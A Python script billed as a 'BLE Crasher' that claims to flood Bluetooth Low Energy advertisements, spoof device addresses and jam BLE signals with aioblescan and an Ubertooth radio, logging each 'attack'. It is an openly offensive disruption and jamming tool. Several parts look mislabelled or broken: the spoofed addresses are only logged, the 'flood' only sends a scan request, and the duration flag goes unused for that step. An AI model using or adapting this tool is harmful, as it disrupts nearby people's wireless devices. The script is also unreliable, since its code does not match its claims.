#!/usr/bin/env python3

import argparse
import os
import sys
import subprocess
import random
import time
from datetime import datetime

# Optional: aioblescan-based flooding
try:
    from aioblescan.plugins import EddyStone
    import aioblescan as aiobs
    import asyncio
except ImportError:
    aiobs = None

LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
log_file = f"{LOG_DIR}/ble_crash_{timestamp}.log"

def log(msg):
    with open(log_file, "a") as f:
        f.write(msg + "\n")
    print(msg)

def list_hci_devices():
    try:
        output = subprocess.check_output(["hciconfig"], text=True)
        return [line.split(":")[0] for line in output.splitlines() if "hci" in line]
    except Exception as e:
        log(f"[!] Failed to list hci devices: {e}")
        return ["hci0"]

def spoof_device():
    mac = ":".join(f"{random.randint(0,255):02X}" for _ in range(6))
    name = f"BLE_{random.randint(1000,9999)}"
    return mac, name

def flood_ble_with_aioblescan(iface):
    if aiobs is None:
        log("[!] aioblescan not installed. Install with: pip install aioblescan")
        return

    async def main():
        event_loop = asyncio.get_event_loop()
        socket = aiobs.create_bt_socket(iface)
        fac = event_loop._create_connection_transport(socket, aiobs.BLEScanRequester, None, None)
        conn, btctrl = await fac
        await btctrl.send_scan_request()
        log(f"[+] aioblescan BLE advertisement flooding started on {iface}")
        try:
            await asyncio.sleep(60)  # Flood duration
        finally:
            await btctrl.stop_scan_request()
            log("[✓] aioblescan BLE flooding completed.")

    asyncio.run(main())

def start_ubertooth_jammer():
    try:
        subprocess.Popen(["ubertooth-btle", "-f"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log("[+] Ubertooth BLE jamming started.")
    except FileNotFoundError:
        log("[!] ubertooth-btle not found. Skipping SDR BLE jamming.")

def stop_all_ble():
    os.system("pkill -f aioblescan")
    os.system("pkill -f ubertooth")

def main():
    parser = argparse.ArgumentParser(description="BLE Crasher - Flood BLE advertisements and jam signals")
    parser.add_argument("--iface", default="hci0", help="BLE interface (default: hci0)")
    parser.add_argument("--aioble", action="store_true", help="Use aioblescan for advanced flooding")
    parser.add_argument("--jam-sdr", action="store_true", help="Use SDR (Ubertooth/HackRF) BLE jammer")
    parser.add_argument("--duration", type=int, default=60, help="Duration of attack in seconds")
    parser.add_argument("--export", action="store_true", help="Export spoofed device info")
    args = parser.parse_args()

    log(f"=== BLE Crasher Launched ({args.iface}) ===")
    log(f"Log: {log_file}")

    if args.export:
        for _ in range(10):
            mac, name = spoof_device()
            log(f"[+] Spoofed Device: {mac} ({name})")
            time.sleep(0.5)

    if args.aioble:
        flood_ble_with_aioblescan(args.iface)

    if args.jam_sdr:
        start_ubertooth_jammer()

    log("[*] BLE flooding active. Press Ctrl+C to stop.")
    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        pass

    stop_all_ble()
    log("[✓] BLE Crasher attack complete.")

if __name__ == "__main__":
    main()
